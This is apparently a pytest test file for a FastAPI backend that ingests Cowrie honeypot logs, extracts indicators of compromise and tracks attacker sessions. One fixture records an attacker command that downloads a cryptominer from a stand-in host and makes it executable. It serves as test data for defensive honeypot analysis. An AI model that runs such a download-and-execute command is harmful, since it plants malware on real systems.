"""Tests for FastAPI endpoints."""
import pytest
from httpx import AsyncClient, ASGITransport
from backend.app.main import app


@pytest.mark.asyncio
async def test_health_endpoint():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        res = await client.get("/health")
        assert res.status_code == 200
        data = res.json()
        assert data["app_name"] == "ARIA"
        assert "status" in data


@pytest.mark.asyncio
async def test_cowrie_ingest_and_session_lifecycle():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # 1. Ingest connect event
        ev1 = {
            "eventid": "cowrie.session.connect",
            "timestamp": "2026-09-06T00:30:00Z",
            "session": "api_lifecycle_sess",
            "src_ip": "203.0.113.88",
            "src_port": 41234,
            "dst_ip": "10.0.0.50",
            "dst_port": 2222,
        }
        res = await client.post("/api/v1/cowrie/log", json=ev1)
        assert res.status_code == 201

        # 2. Ingest command event
        ev2 = {
            "eventid": "cowrie.command.input",
            "timestamp": "2026-09-06T00:30:10Z",
            "session": "api_lifecycle_sess",
            "src_ip": "203.0.113.88",
            "input": "wget http://badc2.org/miner -O /tmp/miner && chmod +x /tmp/miner",
        }
        res = await client.post("/api/v1/cowrie/log", json=ev2)
        assert res.status_code == 201
        data = res.json()
        assert data["iocs_extracted"] >= 2

        # 3. Query session
        res = await client.get("/api/v1/sessions/api_lifecycle_sess")
        assert res.status_code == 200
        sess = res.json()
        assert sess["session_id"] == "api_lifecycle_sess"
        assert sess["attacker_ip"] == "203.0.113.88"
        assert len(sess["commands"]) == 1

        # 4. Query IOCs
        res = await client.get("/api/v1/iocs?session_id=api_lifecycle_sess")
        assert res.status_code == 200
        iocs = res.json()
        assert len(iocs) >= 2

        # 5. Query Intents
        res = await client.get("/api/v1/intents/api_lifecycle_sess")
        assert res.status_code == 200
        intents = res.json()
        assert len(intents) >= 1

        # 6. IOC lookup
        res = await client.get("/api/v1/iocs/lookup?value=/tmp/miner")
        assert res.status_code == 200
        assert res.json()["value"] == "/tmp/miner"

        # 7. Delete Session
        del_res = await client.delete("/api/v1/sessions/api_lifecycle_sess")
        assert del_res.status_code == 200

        # 8. Verify 404 after deletion
        get_res = await client.get("/api/v1/sessions/api_lifecycle_sess")
        assert get_res.status_code == 404
